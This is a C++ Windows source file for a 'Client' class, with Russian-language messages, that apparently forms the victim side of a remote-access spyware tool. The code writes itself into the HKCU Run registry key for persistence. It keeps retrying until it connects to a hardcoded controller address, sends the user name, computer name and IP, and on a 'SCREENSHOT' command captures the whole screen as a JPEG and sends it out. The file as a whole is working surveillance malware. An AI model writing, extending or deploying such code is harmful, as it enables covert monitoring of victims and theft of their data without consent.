#include "client.h"
#include <iostream>

WSADATA Client::wsaData;
SOCKET Client::clientSocket;
sockaddr_in Client::serverAddr;

Client::Client()
{
    addToStartup();
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw(std::runtime_error("Ошибка инициализации Winsock"));
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    while (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {

    }

    //std::thread(&Client::recieveData, this).detach();

    getData();

    sendData();

    while (true)
    {
        char buffer[512];
        int bytesReceived = recv(clientSocket, buffer, 512, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';

            if (strcmp(buffer, "PING") == 0) {
                send(clientSocket, "PONG", 4, 0);
            }

            if (strcmp(buffer, "SCREENSHOT") == 0) {
                sendScreenshot();
            }
        }
    }
}

Client::~Client()
{
    closesocket(clientSocket);
    WSACleanup();
}

void Client::getData()
{
    char username[256];
    DWORD username_len = sizeof(username);
    if (GetUserNameA(username, &username_len)) {
        data.user = username;
    }

    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    if (GetComputerNameA(hostname, &hostname_len)) {
        data.machine = hostname;
    }

    struct addrinfo hints, * res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(hostname, NULL, &hints, &res) == 0) {
        char ip[INET_ADDRSTRLEN];
        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &sockaddr_ipv4->sin_addr, ip, sizeof(ip));
        data.ip = ip;
        freeaddrinfo(res);
    }

}

void Client::sendData()
{
    std::string message = data.machine + '\n' + data.ip + '\n' + data.user + '\n';
    send(clientSocket, message.c_str(), strlen(message.c_str()), 0);
}

void Client::sendScreenshot()
{
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);

    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    CImage image;
    image.Attach(hBitmap);

    IStream* pStream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    if (SUCCEEDED(hr)) {
        hr = image.Save(pStream, Gdiplus::ImageFormatJPEG);
        if (SUCCEEDED(hr)) {
            STATSTG statstg;
            pStream->Stat(&statstg, STATFLAG_DEFAULT);
            size_t size = statstg.cbSize.QuadPart;

            pStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

            send(clientSocket, "SCREENSHOT", 10, 0);

            send(clientSocket, (const char*)&size, sizeof(size), 0);

            std::vector<char> buffer(size);
            ULONG bytesRead;
            pStream->Read(buffer.data(), size, &bytesRead);
            send(clientSocket, buffer.data(), size, 0);
        }
        pStream->Release();
    }

    DeleteObject(hBitmap);
}

void Client::addToStartup() {
    HKEY hKey;
    std::wstring appName = L"ClientApp";

    wchar_t appPath[MAX_PATH];
    GetModuleFileName(NULL, appPath, MAX_PATH);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {

        wchar_t existingPath[MAX_PATH];
        DWORD bufferSize = sizeof(existingPath);
        DWORD type = REG_SZ;

        if (RegQueryValueEx(hKey, appName.c_str(), 0, &type, reinterpret_cast<LPBYTE>(existingPath), &bufferSize) == ERROR_SUCCESS) {
            if (wcscmp(appPath, existingPath) == 0) {
                std::wcout << L"Приложение уже находится в автозагрузке.\n";
                RegCloseKey(hKey);
                return;
            }
        }

        if (RegSetValueEx(hKey, appName.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(appPath),
            (wcslen(appPath) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            std::wcout << L"Приложение успешно добавлено в автозагрузку.\n";
        }
        else {
            std::wcout << L"Ошибка добавления в автозагрузку.\n";
        }

        RegCloseKey(hKey);
    }
    else {
        std::wcout << L"Не удалось открыть ключ реестра.\n";
    }
}
